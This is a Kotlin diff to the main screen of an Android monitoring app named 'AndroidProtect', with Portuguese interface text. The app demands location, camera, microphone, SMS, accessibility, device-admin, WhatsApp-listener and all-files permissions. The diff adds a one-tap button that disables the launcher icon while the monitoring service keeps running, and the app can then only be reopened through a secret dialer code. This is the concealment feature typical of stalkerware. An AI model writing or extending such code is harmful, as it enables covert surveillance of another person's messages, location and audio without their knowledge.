@@ -240,6 +240,7 @@ class MainActivity : ComponentActivity() {
         var isServiceActive by remember { mutableStateOf(AntiTheftService.isServiceRunning) }
         var testResult     by remember { mutableStateOf<String?>(null) }
         var isTesting      by remember { mutableStateOf(false) }
+        var showHideDialog by remember { mutableStateOf(false) }
 
         // Observe permission states
         val hasLocation   by hasLocationState
@@ -258,6 +259,9 @@ class MainActivity : ComponentActivity() {
             android.os.Environment.isExternalStorageManager() else true
 
         val isBatteryOptimized = isBatteryOptimizedFor(context)
+        val allGranted = hasLocation && hasBgLocation && hasCamera && hasMic &&
+                hasPhone && hasSms && hasActivity && hasNotify && hasAccessibility && hasAdmin &&
+                hasWhatsAppListener && hasAllFiles && !isBatteryOptimized
 
         // Auto-start service on first compose
         LaunchedEffect(Unit) {
@@ -277,6 +281,41 @@ class MainActivity : ComponentActivity() {
                 if (linkStatus == "connecting" && wsConnected) linkStatus = "ok"
                 kotlinx.coroutines.delay(2000)
             }
+        }
+
+        // ── Confirmation dialog for hiding the app ────────────────────────────
+        if (showHideDialog) {
+            AlertDialog(
+                onDismissRequest = { showHideDialog = false },
+                containerColor = Color(0xFF12141D),
+                title = { Text("Ocultar aplicativo?", color = Color.White, fontWeight = FontWeight.Bold) },
+                text = {
+                    Text(
+                        "O ícone será removido da gaveta de aplicativos. O serviço de monitoramento continua ativo em segundo plano.\n\nPara reabrir o app, use o código de discagem: *#*#7777#*#*",
+                        color = Color(0xFF8E94A5), fontSize = 13.sp, lineHeight = 19.sp
+                    )
+                },
+                confirmButton = {
+                    Button(
+                        onClick = {
+                            showHideDialog = false
+                            packageManager.setComponentEnabledSetting(
+                                ComponentName(context, MainActivity::class.java),
+                                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                                PackageManager.DONT_KILL_APP
+                            )
+                            finish()
+                        },
+                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFFF3838))
+                    ) { Text("Ocultar agora", color = Color.White, fontWeight = FontWeight.Bold) }
+                },
+                dismissButton = {
+                    OutlinedButton(
+                        onClick = { showHideDialog = false },
+                        colors = ButtonDefaults.outlinedButtonColors(contentColor = Color(0xFF8E94A5))
+                    ) { Text("Cancelar") }
+                }
+            )
         }
 
         Column(
@@ -585,9 +624,6 @@ class MainActivity : ComponentActivity() {
                     PermRow("Sem otimização de bateria (conexão estável)", !isBatteryOptimized)
                 }
 
-                val allGranted = hasLocation && hasBgLocation && hasCamera && hasMic &&
-                        hasPhone && hasSms && hasActivity && hasNotify && hasAccessibility && hasAdmin &&
-                        hasWhatsAppListener && hasAllFiles && !isBatteryOptimized
                 Spacer(Modifier.height(14.dp))
 
                 if (!allGranted) {
@@ -719,20 +755,42 @@ class MainActivity : ComponentActivity() {
                 }
             }
 
-            // ── How to hide app ────────────────────────────────────────────
+            // ── Hide app button ────────────────────────────────────────────
             SectionCard {
-                Label("COMO ESCONDER O APLICATIVO")
+                Label("OCULTAR APLICATIVO")
                 Spacer(Modifier.height(10.dp))
                 Text(
-                    "Mantenha pressionada a tela inicial → Configurações → 'Ocultar aplicativos' → selecione AndroidProtect → Aplicar.\n\nO app continua rodando mesmo sem o ícone visível.",
+                    "Remove o ícone do app da gaveta de aplicativos. O serviço de monitoramento continua ativo em segundo plano.",
                     color = Color(0xFF8E94A5), fontSize = 12.sp, lineHeight = 18.sp,
                     modifier = Modifier.padding(bottom = 14.dp)
                 )
-                Button(
-                    onClick = { openAppSettings() },
-                    modifier = Modifier.fillMaxWidth(), shape = RoundedCornerShape(12.dp),
-                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFFF2A85))
-                ) { Text("Configurações do Sistema", color = Color.White, fontWeight = FontWeight.Bold) }
+                if (allGranted) {
+                    Button(
+                        onClick = { showHideDialog = true },
+                        modifier = Modifier.fillMaxWidth(),
+                        shape = RoundedCornerShape(12.dp),
+                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF1E1030))
+                    ) {
+                        Text("🙈  Ocultar App Agora", color = Color(0xFFFF2A85), fontWeight = FontWeight.Bold, fontSize = 14.sp)
+                    }
+                    Spacer(Modifier.height(8.dp))
+                    Text(
+                        "Para reabrir: disque *#*#7777#*#* no telefone.",
+                        color = Color(0xFF8E94A5), fontSize = 11.sp
+                    )
+                } else {
+                    Box(
+                        Modifier
+                            .fillMaxWidth()
+                            .background(Color(0xFF1E1A0A), RoundedCornerShape(12.dp))
+                            .padding(14.dp)
+                    ) {
+                        Text(
+                            "⚠️ Conceda todas as permissões acima antes de ocultar o app.",
+                            color = Color(0xFFFF9900), fontSize = 12.sp
+                        )
+                    }
+                }
             }
 
             Spacer(Modifier.height(24.dp))
